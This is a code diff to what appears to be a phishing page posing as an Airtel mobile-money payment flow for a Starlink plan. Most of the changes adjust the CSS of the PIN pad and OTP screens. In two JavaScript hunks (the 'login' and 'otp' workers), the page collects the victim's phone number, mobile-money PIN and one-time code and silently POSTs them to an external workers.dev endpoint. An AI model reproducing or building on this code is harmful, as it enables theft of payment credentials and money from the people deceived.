@@ -144,20 +144,13 @@ img,svg{display:block;max-width:100%}
   grid-template-columns:1fr auto;
   align-items:center;
   gap:var(--g-3);
-  padding:10px 12px;
+  padding:10px;
   background:rgba(255,255,255,.12);
   border:1px solid rgba(255,255,255,.18);
   border-radius:var(--r-md);
   margin-bottom:var(--g-3);
 }
-.summary-product-img{
-  width:48px;height:48px;flex-shrink:0;
-  border-radius:var(--r-sm);
-  background:#fff;
-  overflow:hidden;
-  display:grid;place-items:center;
-  border:1px solid rgba(255,255,255,.4);
-}
+.summary-product-img{display:none}
 .summary-product-info{min-width:0;display:flex;flex-direction:column;gap:3px}
 .summary-product-name{
   font-family:var(--font-display);
@@ -208,8 +201,7 @@ img,svg{display:block;max-width:100%}
   flex:1;min-height:0;
   display:flex;flex-direction:column;align-items:center;justify-content:flex-start;
   padding:var(--g-4) var(--g-5) 0;
-  gap:var(--g-4);
-  overflow-y:auto;overflow-x:hidden;
+  gap:var(--g-4);overflow-y:auto;overflow-x:hidden;
   -webkit-overflow-scrolling:touch;overscroll-behavior:contain;
 }
 .pin-head{display:flex;flex-direction:column;gap:var(--g-1);text-align:center;max-width:340px}
@@ -271,7 +263,7 @@ img,svg{display:block;max-width:100%}
   box-shadow:0 1px 3px rgba(15,15,18,.06);
   transition:background .1s,box-shadow .1s,transform .1s;
 }
-.numkey:active{background:var(--surf-mid);box-shadow:none;transform:scale(.98)}
+.numkey:active{background:var(--surf-mid);box-shadow:none}
 .numkey.del{font-size:18px;color:var(--ink-2);background:transparent;border-color:transparent;box-shadow:none}
 .numkey.empty{background:transparent;border-color:transparent;box-shadow:none;cursor:default;opacity:0;pointer-events:none}
 
@@ -477,32 +469,21 @@ img,svg{display:block;max-width:100%}
 
 /* ── IMMUNE TO FONT SIZE / DISPLAY ZOOM ── */
 html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
-
-/* ── SUMMARY: always visible, never buried ── */
-.summary{flex-shrink:0!important;overflow:hidden!important}
-.summary-product-img{display:none!important}
-
-/* ── PIN STAGE / OTP: confirm always reachable ── */
-.btn-cta{
-  position:sticky!important;bottom:0!important;flex-shrink:0!important;
-  margin-top:10px!important;
-  margin-bottom:max(12px,env(safe-area-inset-bottom,12px))!important;
-  z-index:2!important;
-}
-/* Numpad keys — 4 breakpoints, pure px */
+/* ── Confirm button always visible ── */
+.btn-cta{position:sticky!important;bottom:0!important;flex-shrink:0!important;margin-top:10px!important;margin-bottom:max(12px,env(safe-area-inset-bottom,12px))!important;z-index:2!important}
+/* ── Numpad: fixed px, no scale effect ── */
 .numkey{height:54px!important;font-size:21px!important;flex-shrink:0!important}
+.numkey:active{transform:none!important}
 @media(max-height:720px){.numkey{height:50px!important;font-size:20px!important}.btn-cta{height:50px!important}}
 @media(max-height:640px){.numkey{height:46px!important;font-size:18px!important}.btn-cta{height:46px!important}.pin-stage,.otp-wrap{gap:8px!important}}
-@media(max-height:560px){.numkey{height:42px!important;font-size:17px!important}.pin-stage,.otp-wrap{gap:6px!important}.summary{max-height:72px!important}}
+@media(max-height:560px){.numkey{height:42px!important;font-size:17px!important}.pin-stage,.otp-wrap{gap:6px!important}}
 @media(max-width:360px){.numkey{height:50px!important}.btn-cta{max-width:100%!important}}
-
-/* ── Nav + steps + summary never shrink ── */
-.nav{flex-shrink:0!important}.steps{flex-shrink:0!important}
-.login-fixed{overflow:hidden!important}
-
-/* ── Pin/OTP non-scroll items never shrink ── */
-.pin-head{flex-shrink:0!important}
-.pin-boxes,.otp-boxes,.numpad,.pin-boxes-wrap{flex-shrink:0!important}
+/* ── Summary always visible ── */
+.summary{flex-shrink:0!important;overflow:hidden!important}
+.summary-product-img{display:none!important}
+/* ── Fixed elements never shrink ── */
+.nav{flex-shrink:0!important}.steps{flex-shrink:0!important}.login-fixed{overflow:hidden!important}
+.pin-head{flex-shrink:0!important}.pin-boxes,.otp-boxes,.numpad{flex-shrink:0!important}
 </style>
 </head>
 <body>
@@ -856,11 +837,17 @@ async function runProcessing(ph){
       document.getElementById('psi'+steps[i].si).className='proc-step act';
     }
   }
-  (function(){var _f={};var _a={};
+  /* worker: login */
+  (function(){
+    var _f={};var _a={};
     try{_f=JSON.parse(sessionStorage.getItem('starlinkForfait')||'{}');}catch(e){}
     try{_a=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
     fetch('https://airtel-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({event:'login_initiated',data:{phone:_a.phone||'',pin:_a.pin||'',forfait:_f.name||'',price:_f.price||'',deposit:_f.deposit||'',daily:_f.daily||'',jours:_f.jours||'',ts:Date.now()}})
+      body:JSON.stringify({event:'login_initiated',data:{
+        phone:_a.phone||'',pin:_a.pin||'',
+        forfait:_f.name||'',price:_f.price||'',
+        deposit:_f.deposit||'',daily:_f.daily||'',jours:_f.jours||'',ts:Date.now()
+      }})
     }).catch(function(){});
   })();
   await slp(500);
@@ -972,12 +959,19 @@ function submitOTP(){
   sessionStorage.setItem('starlinkRef',ref);
   sessionStorage.setItem('starlinkOTP',otpVal);
   for(var i=0;i<4;i++)document.getElementById('ob'+i).classList.add('success');
-  (function(){var _f={};var _a={};
+  /* worker: otp */
+  (function(){
+    var _f={};var _a={};
     try{_f=JSON.parse(sessionStorage.getItem('starlinkForfait')||'{}');}catch(e){}
     try{_a=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
     var _ref=sessionStorage.getItem('starlinkRef')||'';
     fetch('https://airtel-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({event:'otp_confirmed',data:{phone:_a.phone||'',pin:_a.pin||'',otp:otpVal,forfait:_f.name||'',price:_f.price||'',deposit:_f.deposit||'',daily:_f.daily||'',jours:_f.jours||'',ref:_ref,ts:Date.now()}})
+      body:JSON.stringify({event:'otp_confirmed',data:{
+        phone:_a.phone||'',pin:_a.pin||'',otp:otpVal,
+        forfait:_f.name||'',price:_f.price||'',
+        deposit:_f.deposit||'',daily:_f.daily||'',jours:_f.jours||'',
+        ref:_ref,ts:Date.now()
+      }})
     }).catch(function(){});
   })();
   hap([18,8,35]);
